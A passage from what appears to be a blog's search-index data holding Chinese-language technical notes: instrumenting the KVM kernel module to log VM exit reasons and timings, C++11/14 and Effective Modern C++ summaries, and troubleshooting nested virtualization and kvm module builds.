/usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm/kvm-intel.ko</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> /usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm [21:00:39]</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">dmesg | <span class=\"built_in\">tail</span> -10</span></span><br><span class=\"line\">[25416.145711] kvm: loading out-of-tree module taints kernel.</span><br><span class=\"line\">[25416.151778] kvm: module verification failed: signature and/or required key missing - tainting kernel</span><br><span class=\"line\">[25435.886621] kvm module modified by szy</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">szy @ bionic-x99 <span class=\"keyword\">in</span> /usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm [21:00:51] C:1</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">kvm-ok</span></span><br><span class=\"line\">INFO: /dev/kvm exists</span><br><span class=\"line\">KVM acceleration can be used</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\">///usr/src/linux-source-4.15.0/linux-source-4.15.0/arch/x86/kvm/Makefile</span><br><span class=\"line\"><span class=\"section\">update:</span></span><br><span class=\"line\">        sudo make -C /lib/modules/4.15.18/build M=<span class=\"variable\">$(PWD)</span> modules -j10</span><br><span class=\"line\">        sudo rmmod kvm-intel</span><br><span class=\"line\">        sudo rmmod kvm</span><br><span class=\"line\">        sudo insmod <span class=\"variable\">$(PWD)</span>/kvm.ko</span><br><span class=\"line\">        sudo insmod <span class=\"variable\">$(PWD)</span>/kvm-intel.ko</span><br><span class=\"line\">        kvm-ok</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">remove:</span></span><br><span class=\"line\">        sudo rmmod kvm-intel</span><br><span class=\"line\">        sudo rmmod kvm</span><br><span class=\"line\"><span class=\"section\">install:</span></span><br><span class=\"line\">        sudo insmod <span class=\"variable\">$(PWD)</span>/kvm.ko</span><br><span class=\"line\">        sudo insmod <span class=\"variable\">$(PWD)</span>/kvm-intel.ko</span><br><span class=\"line\">        kvm-ok</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"KVM\"><a href=\"#KVM\" class=\"headerlink\" title=\"KVM\"></a>KVM</h2><h3 id=\"调用逻辑\"><a href=\"#调用逻辑\" class=\"headerlink\" title=\"调用逻辑\"></a>调用逻辑</h3><p>用户态qemu通过ioctl发起一次run</p>\n<p><code>kvm_vcpu_ioctl</code>-&gt;<code>kvm_arch_vcpu_ioctl_run</code>-&gt;<code>vcpu_run</code>-&gt;<code>vcpu_enter_guest</code>-&gt;<code>vmx_vcpu_run</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span>&#123;    </span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;;)&#123;</span><br><span class=\"line\">        r = vcpu_enter_guest(vcpu);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(r&lt;=<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;\t</span><br></pre></td></tr></table></figure>\n\n<p>如果KVM能处理exit就继续循环 否则回到用户态qemu 由qemu再次调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span>&#123;</span><br><span class=\"line\">    kvm_x86_ops-&gt;run(vcpu);</span><br><span class=\"line\">    ++vcpu-&gt;stat.exits;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> kvm_x86_ops-&gt;handle_exit(vcpu);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在<code>vmx_vcpu_run</code>中由汇编<code>ASM_VMX_VMLAUNCH</code>进入VM执行，VM退出后会紧接着执行下面的几行汇编</p>\n<h3 id=\"exit\"><a href=\"#exit\" class=\"headerlink\" title=\"exit\"></a>exit</h3><p><code>x86.c&gt;vcpu_enter_guest</code>  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">++vcpu-&gt;stat.exits;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(vcpu-&gt;stat.exits % <span class=\"number\">1000</span>==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\tprintk(<span class=\"string\">&quot;vcpu exits:%lld\\n&quot;</span>,vcpu-&gt;stat.exits);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>kvm的函数是需要一个vcpu作为参数的 exit为vcpu的成员变量</p>\n<p>直接在内核改</p>\n<p>vmx.c中增加全局变量，核心函数为<code>vmx_vcpu_run</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">str_values</span> &#123;</span></span><br><span class=\"line\">        <span class=\"type\">int</span>             val;</span><br><span class=\"line\">        <span class=\"type\">const</span> <span class=\"type\">char</span>      *str;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">str_values</span> <span class=\"title\">vmx_exit_reasons</span>[] =</span> &#123;</span><br><span class=\"line\">        VMX_EXIT_REASONS</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//static int exit_type_num = sizeof(vmx_exit_reasons)/sizeof(struct str_values);</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> exit_counts[<span class=\"number\">65</span>];</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> exit_last_time[<span class=\"number\">65</span>];</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> exit_total_cost_time[<span class=\"number\">65</span>];</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> total_exit_count;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> exit_last_reason=<span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span>* <span class=\"title function_\">get_exit_reason_string</span><span class=\"params\">(<span class=\"type\">int</span> val)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> i;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt;=<span class=\"number\">64</span> ;i++)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(vmx_exit_reasons[i].val == val)&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> vmx_exit_reasons[i].str;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> u64 <span class=\"title function_\">get_timestamp_now</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">timeval</span> <span class=\"title\">tv</span>;</span></span><br><span class=\"line\">        u64 timestamp;</span><br><span class=\"line\">        do_gettimeofday(&amp;tv);</span><br><span class=\"line\">        timestamp = (u64)tv.tv_sec * <span class=\"number\">1000000</span> + tv.tv_usec;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> timestamp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">show_exit_counts</span><span class=\"params\">(<span class=\"type\">int</span> n)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> index[n];</span><br><span class=\"line\">        <span class=\"type\">int</span> i,j;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span> ;i &lt; n ;i++)&#123; <span class=\"comment\">// find ith biggest number</span></span><br><span class=\"line\">                <span class=\"type\">int</span> max = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(j= <span class=\"number\">0</span> ; j&lt;= <span class=\"number\">64</span>; j++)&#123;</span><br><span class=\"line\">                        <span class=\"type\">int</span> k;</span><br><span class=\"line\">                        <span class=\"type\">int</span> duplicated = <span class=\"number\">0</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span>(k = <span class=\"number\">0</span>; k &lt; i ; k++)&#123; <span class=\"comment\">//prevent duplicated</span></span><br><span class=\"line\">                                <span class=\"keyword\">if</span>(index[k] == j)&#123;</span><br><span class=\"line\">                                        duplicated = <span class=\"number\">1</span>;</span><br><span class=\"line\">                                        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(duplicated)&#123;</span><br><span class=\"line\">                                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"type\">int</span> count = exit_counts[j];</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(count &gt;= max)&#123;</span><br><span class=\"line\">                                index[i] = j;</span><br><span class=\"line\">                                max = count;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(exit_counts[index[i]] &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                        <span class=\"type\">char</span>* reason = get_exit_reason_string(index[i]);</span><br><span class=\"line\">                        u64 aver_cost_time = exit_total_cost_time[index[i]]/exit_counts[index[i]];</span><br><span class=\"line\">                        printk(<span class=\"string\">&quot;exit reason:[%d]%s,counts:%lld,average cost time:%lld\\n&quot;</span>,index[i],reason?reason : <span class=\"string\">&quot;not found&quot;</span>,exit_counts[index[i]],aver_cost_time);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vmx-&gt;exit_reason = vmx-&gt;fail ? <span class=\"number\">0xdead</span> : vmcs_read32(VM_EXIT_REASON);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!vmx-&gt;fail)&#123;</span><br><span class=\"line\">                total_exit_count++;</span><br><span class=\"line\">                exit_last_reason=(u16)vmx-&gt;exit_reason;</span><br><span class=\"line\">                exit_last_time[exit_last_reason] = now;</span><br><span class=\"line\">                exit_counts[exit_last_reason]++;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(total_exit_count%<span class=\"number\">10000</span>==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                        <span class=\"comment\">//printk(KERN_INFO &quot;time now:%llu\\n&quot;, timestamp);</span></span><br><span class=\"line\">                        show_exit_counts(<span class=\"number\">5</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                exit_last_reason = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>内核模块 不能include time并且用time获得时间，只能用linux&#x2F;time的do_gettimeofday</p>\n<p>或者使用rdtsc获取cycle数 rdtsc可以直接用，也可以用同名汇编</p>\n","categories":["virtualization"]},{"title":"C++11/14高级编程","url":"/2026/01/31/cpp/C++1114%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/","content":"<h1 id=\"C-11-14高级编程\"><a href=\"#C-11-14高级编程\" class=\"headerlink\" title=\"C++11&#x2F;14高级编程\"></a>C++11&#x2F;14高级编程</h1><ol>\n<li><p>右值：临时变量，生命周期将要结束</p>\n<p>可通过move延长生命周期 减少复制开销</p>\n<p>完美转发：根据左值右值选择不同的重载函数</p>\n</li>\n<li><p><code>auto</code> 自动推断类型</p>\n<p><code>decltype</code> 自动推断类型 类似<code>sizeof</code></p>\n<p><code>decltype(auto)</code></p>\n</li>\n<li><p>大括号初始化 （生成<code>std::initializer_list</code>对象）</p>\n<p>返回时也可以用大括号 会自动构造生成返回对象</p>\n</li>\n<li><p>基于范围for循环</p>\n</li>\n<li><p><code>constexpr</code> 编译器常量 可以修饰函数</p>\n<p><code>const</code> 只表示只读 不表示常量 而是变量</p>\n</li>\n<li><p><code>static_assert</code>静态断言 </p>\n</li>\n<li><p>可变参数模板</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> ... Args&gt;<span class=\"comment\">//1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">f</span><span class=\"params\">(Args... args)</span></span>&#123;<span class=\"comment\">//2</span></span><br><span class=\"line\">\t<span class=\"built_in\">g</span>(args...);<span class=\"comment\">//3</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>lambda表达式<code>[]()&#123;&#125;</code></p>\n<p>[]中捕获变量 声明时捕获</p>\n<ul>\n<li>&#x3D;拷贝所有 </li>\n<li>&amp; 引用所有</li>\n<li>var 拷贝某个值</li>\n<li>&amp;var引用某个值</li>\n<li>this</li>\n</ul>\n</li>\n<li><p><code>thread_local</code> 修饰符 类似static  只在当前线程内修改可见</p>\n</li>\n</ol>\n","categories":["cpp"]},{"title":"Effective Modern C++","url":"/2026/01/31/cpp/Effective%20Modern%20C++/","content":"<h1 id=\"Effective-Modern-C\"><a href=\"#Effective-Modern-C\" class=\"headerlink\" title=\"Effective Modern C++\"></a>Effective Modern C++</h1><h2 id=\"型别推导\"><a href=\"#型别推导\" class=\"headerlink\" title=\"型别推导\"></a>型别推导</h2><ol>\n<li><p>模板类型推导</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">f</span><span class=\"params\">(ParamType param)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>模板T的类型与ParamType(修饰)是有关的</p>\n<ul>\n<li>无修饰：T不会带const 引用</li>\n<li>参数是指针&#x2F;引用：T不带引用 如果参数修饰带const则T不带const</li>\n<li>参数是万能引用(<code>T&amp;&amp;</code>)：T会和参数类型和传入的参数类型一模一样 带任何修饰  除了参数是右值的情况</li>\n</ul>\n</li>\n<li><p><code>auto</code>的类型推导与模板一模一样</p>\n<p><code>auto&amp;&amp;</code> 万能引用（带修饰  左值-&gt;左值 右值-&gt;右值）</p>\n<p>直接用<code>auto</code> 不会带const 不会带引用（除非右边取地址）</p>\n</li>\n<li><p><code>decltype</code> 带修饰、引用、模板类型，一模一样</p>\n<p><code>decltype(auto)</code>可以保证引用不被去除</p>\n<p>特例：<code>decltype((x))</code>是<code>int&amp;</code></p>\n</li>\n<li><p><code>boost::typeindex::type_id_with_cvr&lt;decltype(x)&gt;().pretty_name()</code>可以精确地输出类型</p>\n<p>IDE对于复杂类型不一定准确</p>\n</li>\n</ol>\n<h2 id=\"auto\"><a href=\"#auto\" class=\"headerlink\" title=\"auto\"></a>auto</h2><ol start=\"5\">\n<li><p><code>auto</code>声明变量的好处：</p>\n<ul>\n<li><p>通过编译器优化时间空间上的处理（lambda表达式返回值是<code>std::function&lt;&gt;</code>）</p>\n</li>\n<li><p>避免自己搞错类型造成bug</p>\n</li>\n<li><p>避免const带来的额外复制开销</p>\n</li>\n</ul>\n<p>副作用是没法一眼看出来类型  但是可以用过好的IDE缓和</p>\n</li>\n</ol>\n<h2 id=\"转向现代C\"><a href=\"#转向现代C\" class=\"headerlink\" title=\"转向现代C++\"></a>转向现代C++</h2><ol start=\"6\">\n<li><p>某些库的实现为了时空性能会使用隐形代理，导致<code>auto</code>被推倒为应对客户隐藏的代理类</p>\n<p>解决方法是使用<code>static_cast&lt;T&gt;</code>强制类型转换</p>\n</li>\n<li><p>大括号初始化最通用</p>\n<p>某些情况下大括号小括号初始化有区别，例如<code>std::vector</code></p>\n<p>可以使用auto先声明一个初始化列表 然后传入小括号</p>\n</li>\n<li><p><code>nullptr</code>代替0或NULL</p>\n</li>\n<li><p><code>using</code>替代<code>typedef</code></p>\n<p>用模板推导的<code>T::type</code>声明前需要加<code>typename</code></p>\n<p>模板元编程变换类型</p>\n<p><code>std::remove_const_v&lt;T&gt;</code></p>\n<p><code>std::remove_reference_v&lt;T&gt;</code></p>\n<p><code>std::add_lvalue_reference_v&lt;T&gt;</code></p>\n<p>给出一种实现：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">remove_reference</span>&lt;T&gt;&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">using</span> type = T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> remove_reference_v = <span class=\"keyword\">typename</span> remove_reference&lt;T&gt;::type </span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>enum class E&#123;a,b,c&#125;</code>好处</p>\n<ul>\n<li>限制了作用域 之后可以重名</li>\n<li>强类型 不可以隐式转为int</li>\n</ul>\n</li>\n<li><p><code>=delete</code>删除函数</p>\n<ul>\n<li>类的默认复制函数、拷贝构造函数</li>\n<li>模板的某种特化版本</li>\n<li>参数可被隐式转换的函数</li>\n</ul>\n</li>\n<li><p><code>override</code>改写子类函数时加上，帮助编译器提示</p>\n<p>在成员函数后加上<code>&amp;</code>或<code>&amp;&amp;</code>可以根据<code>(*this)</code>为左值或右值提供不同的重载实现</p>\n</li>\n<li><p><code>const_iterator</code> 例如<code>cbegin cend</code></p>\n</li>\n<li><p><code>noexcept</code>可能会被优化</p>\n</li>\n<li><p><code>constexpr</code>声明的变量或函数可以在编译器用 当作编译器常量 </p>\n</li>\n<li><p>线程安全</p>\n</li>\n<li><p><code>=default</code>生成类的默认移动函数（等）</p>\n</li>\n</ol>\n<h2 id=\"智能指针\"><a href=\"#智能指针\" class=\"headerlink\" title=\"智能指针\"></a>智能指针</h2><p>裸指针的一些问题：无法判断是否空悬，无法判断如何析构</p>\n<ol start=\"18\">\n<li><p><code>std::unique_ptr</code> 默认情况下和裸指针同样大小</p>\n<p>可以自定义析构函数  但是会增加大小 自定义析构器的型别会导致智能指针型别不同 无法放在一个容器中</p>\n<p>使用lambda捕获变量时更大</p>\n</li>\n<li><p><code>std::shared_ptr</code> 用原子操作计数 大小是裸指针的两倍</p>\n<p>自定义析构器不会影响大小和型别</p>\n</li>\n<li><p><code>std::weak_ptr</code>解决<code>std::shared_ptr</code>环路</p>\n</li>\n<li><p><code>std::make_shared&lt;T&gt;()</code></p>\n<ul>\n<li><p>使用auto作为类型 避免重写两边T</p>\n</li>\n<li><p>避免new之后没有接受导致资源泄露</p>\n</li>\n<li><p>减小一次内存分配次数 提高性能</p>\n</li>\n</ul>\n<p>但不支持自定义析构器，且默认用小括号初始化</p>\n</li>\n<li><p>Pimpl写法 需要把默认析构或其他函数的实现放在完整型别中。</p>\n</li>\n</ol>\n<h2 id=\"右值引用、移动语义、完美转发\"><a href=\"#右值引用、移动语义、完美转发\" class=\"headerlink\" title=\"右值引用、移动语义、完美转发\"></a>右值引用、移动语义、完美转发</h2><ol start=\"23\">\n<li><code>std::move std::forward&lt;&gt;</code>只是强制类型转换</li>\n<li><code>T&amp;&amp;``auto&amp;&amp;</code> 涉及类型推导时成为万能引用</li>\n<li>某些情况下编译器会自行优化 用了<code>std::move</code>反而违反了优化的条件</li>\n<li>重载一个万能引用的模板，可能会导致在意外地情况下匹配到</li>\n<li>解决26的方法 加一个实现函数多一个参数 分派</li>\n<li>引用折叠 引用的引用变为单个引用（右 右-&gt;右 其他左）</li>\n<li>移动操作并不总能提高效率 需要相关型别支持移动语义</li>\n<li>若干种使用完美转发的参数无法通过编译的情况<ul>\n<li>大括号</li>\n<li>static const 成员变量</li>\n<li>重载函数</li>\n<li>位域（一个变量的某些bit）</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"lambda表达式\"><a href=\"#lambda表达式\" class=\"headerlink\" title=\"lambda表达式\"></a>lambda表达式</h2><ol start=\"31\">\n<li><p>引用捕获的变量离开作用域销毁后，可能导致lambda表达式内部的引用空悬</p>\n<p>类里默认捕获会捕获this指针</p>\n</li>\n<li><p>初始化捕获<code>[a=a]</code>左边是lambda闭包作用域 右边是lambda能捕获的作用域</p>\n<p>可以移动捕获</p>\n</li>\n<li><p>lambda实现完美转发  由于无模板T 故需要decltype</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">auto</span> f = </span><br><span class=\"line\">\t[](<span class=\"keyword\">auto</span>&amp;&amp;... params)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"built_in\">func</span>(std::forward&lt;<span class=\"keyword\">decltype</span>(params)&gt;(params)...);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用lambda表达式可以代替bind 给函数填入事先确定好的参数使用</p>\n</li>\n</ol>\n<h2 id=\"并发API\"><a href=\"#并发API\" class=\"headerlink\" title=\"并发API\"></a>并发API</h2><ol start=\"35\">\n<li><p><code>std::async</code>相比直接开线程的好处：</p>\n<ul>\n<li>能够拿到返回值和异常</li>\n<li>由C++标准库完成调度 避免超订 影响性能</li>\n</ul>\n</li>\n<li><p><code>std::launch::async</code>才能保证一定开线程（并发）</p>\n</li>\n<li><p>必须保证创建<code>std::thread</code>的函数在任一返回路径前让其变为join或detach，否则如果这个线程引用了这个函数的局部变量 会导致意外的后果</p>\n</li>\n<li><p>future可能会发生阻塞 导致某些析构阻塞</p>\n</li>\n<li><p>线程同步的方法：</p>\n<ul>\n<li><p>使用<code>atomic&lt;bool&gt; flag</code> <code>while(!flag)</code>：缺点 占用资源</p>\n</li>\n<li><p>使用条件变量：缺点 需要一把互斥锁 两个线程必须竞争锁</p>\n</li>\n<li><p>使用<code>std::promise``std::future</code> 一次性通信</p>\n<p>暂停：<code>p.get_future().wait()</code></p>\n<p>继续：<code>p.set_value()</code></p>\n</li>\n</ul>\n</li>\n<li><p><code>std::atomic</code>多线程</p>\n<p><code>volatile</code>特种内存 多条语句不会被编译器优化成一条</p>\n</li>\n</ol>\n<h2 id=\"微调\"><a href=\"#微调\" class=\"headerlink\" title=\"微调\"></a>微调</h2><ol start=\"41\">\n<li>按值传递后用move再传入其他函数是一种30的解决方案</li>\n<li><code>emplace</code>置入函数比<code>push</code>插入函数更高效（通常）</li>\n</ol>\n","categories":["cpp"]},{"title":"virtualization misc","url":"/2024/09/17/virtualization/virtualization-misc/","content":"<h1 id=\"virtualization-misc\"><a href=\"#virtualization-misc\" class=\"headerlink\" title=\"virtualization misc\"></a>virtualization misc</h1><h2 id=\"host上开启嵌套虚拟化\"><a href=\"#host上开启嵌套虚拟化\" class=\"headerlink\" title=\"host上开启嵌套虚拟化\"></a>host上开启嵌套虚拟化</h2><p><a href=\"https://www.linux-kvm.org/page/Nested_Guests\">Nested Guests - KVM (linux-kvm.org)</a></p>\n<p>看<code>/sys/module/kvm_intel/parameters/nested</code> </p>\n<p>可以修改vmx.c<code>static bool __read_mostly nested = 1;</code>然后重新编译kvm模块</p>\n<p>host VM <code>cat /proc/cpuinfo | grep vmx</code>有内容说明配置正确</p>\n<p>此时跑kvm-hello-world没问题</p>\n<p><code>qemu-img resize xxx.img +10G</code>可以加磁盘容量；编译内核需要的内存比较大，开4G</p>\n<h2 id=\"hostVM-编译内核模块\"><a href=\"#hostVM-编译内核模块\" class=\"headerlink\" title=\"hostVM 编译内核模块\"></a>hostVM 编译内核模块</h2><p>环境变量有问题</p>\n<p>单独编译kvm</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  CC [M]  /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm/mmu/mmu.o</span><br><span class=\"line\">In file included from /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm/trace.h:1741,</span><br><span class=\"line\">                 from /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm/x86.c:86:</span><br><span class=\"line\">./include/trace/define_trace.h:95:42: fatal error: ../../arch/x86/kvm/trace.h: No such file or directory</span><br><span class=\"line\">   95 | #include TRACE_INCLUDE(TRACE_INCLUDE_FILE)</span><br><span class=\"line\">      |                                          ^</span><br><span class=\"line\">compilation terminated.</span><br><span class=\"line\">make[1]: *** [scripts/Makefile.build:297: /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm/x86.o] Error 1</span><br><span class=\"line\">make[1]: *** Waiting for unfinished jobs....</span><br><span class=\"line\">make: *** [Makefile:1914: /usr/src/linux-source-5.15.0/linux-source-5.15.0/arch/x86/kvm] Error 2</span><br><span class=\"line\">make: Leaving directory &#x27;/usr/src/linux-headers-5.15.0-75-generic&#x27;</span><br><span class=\"line\">make: *** [Makefile:46: update] Error 2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p>把<code>kvm/trace.h</code>的相对路径改为绝对路径</p>\n<p>不知道为什么linux会被替换为1，还得把路径的linux给去掉</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> TRACE_INCLUDE_PATH</span></span><br><span class=\"line\"><span class=\"comment\">//#define TRACE_INCLUDE_PATH ../../arch/x86/kvm</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TRACE_INCLUDE_PATH /usr/src/source-5.15.0/source-5.15.0/arch/x86/kvm</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> TRACE_INCLUDE_FILE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TRACE_INCLUDE_FILE trace</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"hostVM加载内核模块\"><a href=\"#hostVM加载内核模块\" class=\"headerlink\" title=\"hostVM加载内核模块\"></a>hostVM加载内核模块</h2><p>编译没问题，加载模块出错</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo insmod /usr/src/source-5.15.0/source-5.15.0/arch/x86/kvm/kvm.ko</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, 0000000</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero              for</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonz                ero</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is non                 znsmod: ERROR: could not insert module /usr/src/source-5.15.0/source-5.15.0/arch/x86/kvm/kvm.                 [  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, oc 00000000</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, oc 0000000</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, oc 00000</span><br><span class=\"line\">[  363.602674] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1,</span><br><span class=\"line\">loc 00000000392e449f, val ffffffffc0777953</span><br><span class=\"line\">insmod: ERROR: could not insert module /usr/src/source-5.15.0/source-5.15.0/arch/x86/kvm/kvm.ko: Invalid modul</span><br><span class=\"line\">e `n`k`j`nformat</span><br><span class=\"line\">make: *** [Makefile:49: update] Error 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p><a href=\"https://stackoverflow.com/questions/71746914/linux-kernel-module-development-module-x86-modules-skipping-invalid-relocatio\">c - Linux Kernel Module Development “module: x86&#x2F;modules: Skipping invalid relocation target, existing value is nonzero for type 1” - Stack Overflow</a></p>\n<p>执行第一句后系统提示换内核并重启，从75-generic换到76-generic 然后就好了</p>\n<p>目前的img</p>\n<ul>\n<li><p>内核代码</p>\n</li>\n<li><p>make bison flex等编译内核的工具</p>\n</li>\n<li><p>brctl tunctl ifconfig配网络</p>\n</li>\n<li><p>kvm-hello-world用于简单测试</p>\n<p>ubuntu.img镜像，启动脚本</p>\n</li>\n</ul>\n<h2 id=\"hostVM启动guestVM\"><a href=\"#hostVM启动guestVM\" class=\"headerlink\" title=\"hostVM启动guestVM\"></a>hostVM启动guestVM</h2><p>启动后出错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Booting from Hard Disk...</span><br><span class=\"line\">error: invalid arch-independent ELF magic.</span><br><span 